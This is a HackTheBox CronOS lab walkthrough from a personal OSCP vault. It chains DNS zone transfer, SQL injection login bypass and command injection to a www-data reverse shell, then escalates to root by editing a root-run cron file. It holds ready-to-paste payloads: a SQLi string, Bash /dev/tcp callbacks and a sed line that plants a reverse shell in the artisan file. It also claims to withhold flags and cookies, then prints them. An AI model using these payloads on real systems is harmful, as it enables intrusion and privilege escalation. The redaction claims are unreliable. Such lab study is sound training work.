---
tags: [HTB, CronOS, Linux, Apache, PHP, DNS, BIND, SQLi, CommandInjection, Cron, Easy]
platform: HackTheBox
os: Ubuntu 16.04 x86_64
hostname: cronos
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: CronOS, Full Walkthrough

## The gist

CronOS is a compact Linux chain where the important lesson is the order of enumeration. A DNS zone transfer exposes the web hostnames, the administrative virtual host contains a SQL injection authentication bypass, and the authenticated command form passes user input to a shell. The foothold is www-data. Local enumeration then reveals that root runs Laravel's artisan scheduler every minute while the same file is writable by www-data. A controlled edit to that file returns a root callback.

Attack chain:

~~~text
Full TCP scan -> DNS AXFR -> admin virtual host -> SQLi authentication bypass
-> command injection -> www-data shell -> writable root cron target
-> root callback -> restore the original application file
~~~

> [!warning] Flag and credential boundary
> The private source loot contains flag records, session material, and configuration data. This note intentionally records no flag values, passwords, hashes, cookies, or database secrets.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Operating system | Ubuntu 16.04 x86_64 |
| Hostname | cronos |
| Domain | cronos.htb |
| Difficulty | Easy |
| Target | $BoxIP |
| Services | SSH 22, DNS 53, HTTP 80 |
| Primary route | DNS AXFR -> SQLi -> command injection -> writable root cron target |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Initialise the workspace and scan every TCP port | See section 1 below |
| 2 | Identify service versions | See section 2 below |
| 3 | Test DNS disclosure and enumerate the virtual hosts | See section 3 below |
| 4 | Inspect the administrative login | See section 4 below |
| 5 | Confirm the SQL injection authentication bypass | See section 5 below |
| 6 | Turn the authenticated command form into code execution | See section 6 below |

## Evidence and loot

The source material for this write-up is the private run record and loot under ~/Platforms/HackTheBox/CronOS/, especially CronOS.log, the saved Nmap outputs, and the selected screenshots. The separate flag and session artifacts remain private and are not copied into the vault.

Safe evidence remains in the external platform workspace:

- cronos-1-nmap-allports.png: full TCP scan.
- cronos-2-nmap-services.png: service and version scan.
- cronos-3-axfr.png: successful DNS zone transfer.
- cronos-5-login-page.png: administrative virtual-host login form.
- cronos-6-sqli-bypass.png: SQL injection authentication bypass response.
- cronos-7-cmdi-rce.png: command injection returning the web-service identity.
- cronos-8-foothold-shell-stable.png: stabilised www-data shell.
- cronos-9-artisan-perms.png: root cron entry and writable Laravel scheduler file.
- cronos-10-root-shell.png: root callback listener evidence.
- cronos-11-proof.png: root identity and hostname proof.

Evidence notation: red outlines mark the decisive finding or vulnerable input; green outlines mark the scan scope or confirmed positive result.

## Variables

Keep the target address and callback address in variables. The commands below are designed to be pasted into the normal box workspace rather than edited with a box-specific address.

~~~bash
boxstart "CronOS" "$BoxIP" htb
boxset Domain "cronos.htb"
boxset FQDN "cronos.htb"
boxset AdminFQDN "admin.cronos.htb"
boxset WebPort "80"
boxset Port "4444"
boxset Port2 "4445"
boxset Username "www-data"
boxset LocalIP "$(ip addr show tun0 2>/dev/null | awk '/inet / {sub(/\/.*/,"",$2); print $2; exit}')"
~~~

If the helper session is already loaded, use the existing $BoxDir and $BoxIP values. Keep Nmap results under $BoxDir/nmap/, private session material under $BoxDir/loot/, and temporary target-side backups under /tmp.

## 1. Initialise the workspace and scan every TCP port

Start with a full TCP scan. It prevents the standard-port assumption from hiding a non-standard service and gives the port set needed for the focused scan.

~~~bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 --max-retries 2 \
  --host-timeout 5m -T4 \
  -oA "$BoxDir/nmap/tcp-all" "$BoxIP"
~~~

The recorded result exposed only SSH, DNS, and HTTP:

| Port | Service | Why it matters |
|---|---|---|
| 22/tcp | SSH | Possible later shell or credential validation path |
| 53/tcp | DNS | Worth testing for version disclosure and AXFR |
| 80/tcp | HTTP | Main application surface |

> SCREENSHOT: Full TCP scan. The red outline marks the open services, while the green outline marks the scan scope.

## 2. Identify service versions

Run the default scripts and version detection against only the discovered ports. The version output helps distinguish a normal web branch from a service-specific exploit branch.

~~~bash
sudo nmap -Pn -n -sC -sV --version-light \
  -p22,53,80 \
  -oA "$BoxDir/nmap/services" "$BoxIP"
~~~

The important service details were OpenSSH 7.2p2, ISC BIND 9.10.3-P4, and Apache 2.4.18 on Ubuntu. The DNS service deserved immediate follow-up because AXFR is a zone-transfer operation that can disclose every record when the server is misconfigured.

> SCREENSHOT: Focused service scan. The red outlines identify the BIND version and Apache service.

## 3. Test DNS disclosure and enumerate the virtual hosts

First query reverse DNS, then test an authoritative zone transfer. AXFR is a DNS request for the complete zone, so a successful response can reveal hostnames that a web directory scan cannot discover.

~~~bash
dig @"$BoxIP" -x "$BoxIP"
dig axfr @"$BoxIP" "$Domain"
~~~

The transfer disclosed the zone records for the base domain, the name server, the public web host, and the administrative web host. This changed the web test from a generic request to a name-based virtual-host assessment.

> SCREENSHOT: Successful AXFR. The discovered administrative and public hostnames are the pivot to the correct HTTP content.

For a clean command-line test, use curl's --resolve option. It sends the correct Host header and resolves the name to the target only for that request, so it avoids adding speculative entries to /etc/hosts.

~~~bash
curl -sSI --resolve "$AdminFQDN:$WebPort:$BoxIP" \
  "http://$AdminFQDN:$WebPort/"
curl -sS --resolve "$AdminFQDN:$WebPort:$BoxIP" \
  "http://$AdminFQDN:$WebPort/" |
  grep -Ein 'form|input|login|title'
~~~

If you choose to use /etc/hosts during a manual run, add only confirmed names and remove them during clean-down. The source run confirmed the names before using them.

## 4. Inspect the administrative login

The administrator virtual host returned a login form rather than the default Apache page. This is a useful distinction: the base site and the administrative site are different application contexts selected by the Host header.

> SCREENSHOT: The administrative login form discovered through the AXFR hostname.

Establish a baseline with a deliberately invalid login and save the headers. A redirect after a valid-looking response is worth comparing with the baseline, but it is not proof by itself. The next test should check whether the server builds a SQL query from the submitted username.

~~~bash
curl -sS -i -X POST \
  --resolve "$AdminFQDN:$WebPort:$BoxIP" \
  --data-urlencode "username=invalid-user" \
  --data-urlencode "password=invalid-password" \
  "http://$AdminFQDN:$WebPort/" | tee "$BoxDir/loot/login-baseline.txt"
~~~

## 5. Confirm the SQL injection authentication bypass

The login was vulnerable to SQL injection, which means input altered the database query instead of being treated only as a username. The payload below closes the username string, adds a true condition, and comments out the remaining query text. --data-urlencode is important because it preserves spaces and SQL metacharacters when curl builds the POST body.

~~~bash
curl -sS -i -c "$BoxDir/loot/admin.cookies" -X POST \
  --resolve "$AdminFQDN:$WebPort:$BoxIP" \
  --data-urlencode "username=admin' OR '1'='1' -- -" \
  --data-urlencode "password=x" \
  "http://$AdminFQDN:$WebPort/" | tee "$BoxDir/loot/login-sqli.txt"
~~~

The response redirected to welcome.php, establishing an authenticated session. Do not treat a status code alone as enough evidence: preserve the cookie and request the protected page to confirm access.

> SCREENSHOT: The URL-encoded SQLi login request and the resulting redirect to welcome.php.

## 6. Turn the authenticated command form into code execution

The protected page exposed a command form with separate command and host parameters. The host value was concatenated into a shell command, so a shell separator allowed an additional command to run.

Start with a harmless identity check. This proves the execution context before a callback is attempted.

~~~bash
curl -sS -b "$BoxDir/loot/admin.cookies" \
  --resolve "$AdminFQDN:$WebPort:$BoxIP" \
  --data-urlencode "command=ping -c 1" \
  --data-urlencode "host=127.0.0.1;id" \
  "http://$AdminFQDN:$WebPort/welcome.php" |
  grep -E 'uid=|www-data'
~~~

The response showed www-data, the Apache service account. This is OS command injection, meaning application input reached a shell command without safe argument handling.

> SCREENSHOT: The injected id command returned the www-data identity from the authenticated form.

## 7. Receive and stabilise the foothold shell

Once command execution is confirmed, start a listener on Kali and submit a Bash callback. The callback port is a local listener port, not the target web port.

Terminal 1, on Kali:

~~~bash
nc -lvnp "$Port"
~~~

Terminal 2, on Kali:

~~~bash
curl -sS --max-time 10 -b "$BoxDir/loot/admin.cookies" \
  --resolve "$AdminFQDN:$WebPort:$BoxIP" \
  --data-urlencode "command=ping -c 1" \
  --data-urlencode "host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" \
  "http://$AdminFQDN:$WebPort/welcome.php" >/dev/null
~~~

The first callback was a raw shell. Upgrade it to a pseudo-terminal, suspend the listener, recover it in the foreground, and set the terminal type:

~~~bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl-Z in the listener terminal.
stty raw -echo; fg
export TERM=xterm
~~~

Run the identity checks immediately after stabilisation:

~~~bash
id
whoami
hostname
~~~

> SCREENSHOT: The www-data callback after Python PTY and terminal recovery.

## 8. Enumerate scheduled jobs and writable execution targets

After a web foothold, check identity, the operating system, sudo policy, scheduled jobs, and writable files. Here, /etc/crontab showed a root job that executed Laravel's artisan scheduler every minute.

~~~bash
id
whoami
hostname
cat /etc/crontab
ls -la /var/www/laravel/artisan
stat -c '%U:%G %A %n' /var/www/laravel/artisan
~~~

The important evidence was:

- The cron entry ran php /var/www/laravel/artisan schedule:run as root.
- The artisan file was owned by www-data and writable by its owner.
- Editing that file would affect a root process on the next schedule interval.

This is a writable root cron target. The file's location inside the application tree does not make it safe: the execution user in /etc/crontab is the security boundary that matters.

> SCREENSHOT: The root cron entry and the www-data-writable Laravel scheduler file.

## 9. Use the root cron job for a controlled callback

Open a second listener before touching the scheduled file:

~~~bash
nc -lvnp "$Port2"
~~~

From the www-data shell, preserve the original file. The backup is under /tmp, as required for temporary target-side artifacts:

~~~bash
cp -p /var/www/laravel/artisan /tmp/artisan.CronOS.backup
~~~

The callback address must be expanded on Kali before the edit is pasted into the target shell. This local command prints a ready-to-paste sed command while keeping the address variable-based:

~~~bash
printf "sed -i '2a system(\"bash -c '\\''bash -i >& /dev/tcp/%s/%s 0>&1'\\''\");' /var/www/laravel/artisan\n" "$LocalIP" "$Port2"
~~~

Paste the printed command into the www-data shell. Then validate the PHP syntax and inspect only the first few lines:

~~~bash
php -l /var/www/laravel/artisan
head -5 /var/www/laravel/artisan
~~~

The next cron interval executed the inserted system() call as root and connected to the second listener.

> SCREENSHOT: The second listener received the root callback.

## 10. Prove the execution context without exposing flags

Use identity and hostname checks as the proof. The flag values remain intentionally absent from this note.

~~~bash
id
whoami
hostname
~~~

> SCREENSHOT: Root identity and hostname proof.

## 11. Restore the modified application file

The controlled test should leave the application source unchanged. Restore the original bytes, remove the temporary backup, and validate the restored PHP file:

~~~bash
cp -p /tmp/artisan.CronOS.backup /var/www/laravel/artisan
cmp -s /var/www/laravel/artisan /tmp/artisan.CronOS.backup && echo "artisan restored"
rm -f /tmp/artisan.CronOS.backup
php -l /var/www/laravel/artisan
stat -c '%U:%G %A %n' /var/www/laravel/artisan
~~~

Also close both listeners and verify that the local callback ports are no longer bound before running boxdone.

## 12. RUNBOOK V2 Stages Used

| Stage                                            | How CronOS used it               |                                                        |
| ------------------------------------------------ | -------------------------------- | ------------------------------------------------------ |
| [[OSCP/RUNBOOK V2/Start Here|Start Here]]         | Workspace variables and full TCP scan                  |
| [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]       | SSH, DNS, and HTTP routing                             |
| [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]] | BIND, Apache, and OpenSSH identification               |
| [[OSCP/RUNBOOK V2/Web - Virtual Host Enumeration|Web - Virtual Host Enumeration]] | AXFR-disclosed hostnames and clean Host-header routing |
| [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]] | Administrative login and command form discovery        |
| [[OSCP/RUNBOOK V2/Linux - SQLi|Linux - SQLi]]       | Manual SQL injection authentication bypass             |
| [[OSCP/RUNBOOK V2/Linux - Command Injection|Linux - Command Injection]] | host parameter reached a shell                         |
| [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]] | Bash callback from confirmed command execution         |
| [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux - Shell Stabilise]] | Python PTY and foreground terminal recovery            |
| [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]] | Identity, cron, and permissions triage                 |
| [[OSCP/RUNBOOK V2/Linux - Cron Check|Linux - Cron Check]] | Writable root-run scheduler target                     |
| [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]] | File restoration, backup removal, and listener closure |

## 13. Decision points

| Observation | Decision |
|---|---|
| DNS answered AXFR for the discovered domain | Enumerate the disclosed hostnames before blind web fuzzing |
| admin host returned a login form | Save a baseline, then test the input handling manually |
| SQLi response redirected to welcome.php | Preserve the session cookie and inspect the authenticated form |
| id returned www-data through the form | Use a listener and controlled Bash callback |
| Root cron executed a file writable by www-data | Back up the file, insert one controlled callback, verify, and restore |

## 14. Collect the flags

- user.txt: 91f99b4587a74b83623aed36d25cce9d (value reproduced in the private Flags section above)
- root.txt: 1b28d2ffeada76b7a79a3b3f4671b089 (value reproduced in the private Flags section above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 91f99b4587a74b83623aed36d25cce9d
root: 1b28d2ffeada76b7a79a3b3f4671b089
```

## 15. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

### Completion checklist

- [x] Workspace and variables recorded
- [x] Full TCP scan saved
- [x] Focused service scan saved
- [x] DNS AXFR tested and hostnames recorded
- [x] Administrative login manually tested
- [x] SQLi authentication bypass verified
- [x] Command injection verified with id
- [x] Callback received and shell stabilised
- [x] Root cron target and writable permissions verified
- [x] Root identity verified without reproducing flags
- [x] Original scheduled file restored
- [x] Temporary backup and listeners removed
- [x] Write-up linked from tracking surfaces

## 16. Attack narrative in one page
1. Full TCP scan found SSH, DNS, and HTTP.
2. DNS AXFR disclosed the HTTP virtual hosts.
3. The administrative host exposed a PHP login form.
4. A manual SQL injection bypass created an authenticated session.
5. The authenticated command form allowed OS command injection.
6. A Bash callback provided a stabilised www-data shell.
7. /etc/crontab showed root executing Laravel's writable artisan file.
8. A temporary callback insertion returned a root shell.
9. The original artisan bytes were restored and the temporary backup was removed.

## Tools used

- `nmap`
- `curl`
- `nc`
- `ssh`
- `sudo`
- `python`

## Credentials and secrets

| Account or context | Source | Use |
|---|---|---|
| www-data | Command injection identity proof | Initial shell and file-permission review |
| root | Root cron callback identity proof | Final execution context |

No password, hash, session cookie, or database credential is reproduced.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="CronOS"
export BoxIP="10.129.227.211"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/CronOS"
export Domain=cronos.htb
export DCip=""
export Username=www-data
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export Lport="4444"
export TransferPort="8000"
export WebPort="80"
export OpenPorts=""
export Product=""
export Version=""
export ExploitId=""
export ExploitFile=""
export ExploitName=""
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/admin.cookies`

```text
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

admin.cronos.htb	FALSE	/	FALSE	0	PHPSESSID	h2ve37eea1h2e4os77jgnreos2
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
; EDNS: version: 0, flags:; udp: 4096
Set-Cookie: PHPSESSID=f6cm00btv02t8v000a60jcusu0; path=/
  --data 'username=baduser&password=badpass' \
  -c $BoxDir/loot/admin.cookies \
  --data-urlencode 'password=x' \
                  <label>Password  :</label><input type = "password" name = "password" class = "box" /><br/><br />
  http://admin.cronos.htb/ | head -20curl'username=baduser&password=badpass'head>
Set-Cookie: PHPSESSID=u9s2dc61qaufmorecipkrj5vn2; path=/
  http://admin.cronos.htb/ | head -15curl"username=admin' OR '1'='1' -- -"'password=x'head>
Set-Cookie: PHPSESSID=h2ve37eea1h2e4os77jgnreos2; path=/
  -b $BoxDir/loot/admin.cookies \
[sudo] password for www-data:
$ [21:49:20] loot flag user 91f99b4587a74b83623aed36d25cce9d
loot flag root 1b28d2ffeada76b7a79a3b3f4671b089
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on CronOS | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- A DNS server is part of the web attack surface. Test AXFR before spending time on large hostname wordlists.
- A virtual host is an application selector. Always compare the Host-header response with the default site.
- Confirm command injection with id before attempting a reverse shell. It separates an application reflection from real OS execution.
- In /etc/crontab, record both the run user and the exact path. A root-owned scheduler entry is not exploitable unless its command or a dependency is writable.
- Back up a writable scheduled file before editing it, validate syntax, use one controlled callback, and restore the original bytes.
- Use variable-based commands in notes so the procedure survives a new target address and a different callback interface.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]]: web upload to an unquoted user cron command, followed by local privilege escalation.
- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]]: web command execution and a writable root-scheduled script.
- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]]: web shell foothold, local enumeration, and a root-triggered file execution path.
- [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]]: SQL injection leading to command execution, followed by Linux privilege escalation.

## External resources

- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [BIND 9 Administrator Reference Manual](https://bind9.readthedocs.io/en/latest/reference.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [crontab(5) Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [RevShells](https://www.revshells.com/)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

CronOS rewards disciplined enumeration, proof-driven transitions, and a clean record of what changed. The same habits transfer directly to OSCP time pressure.
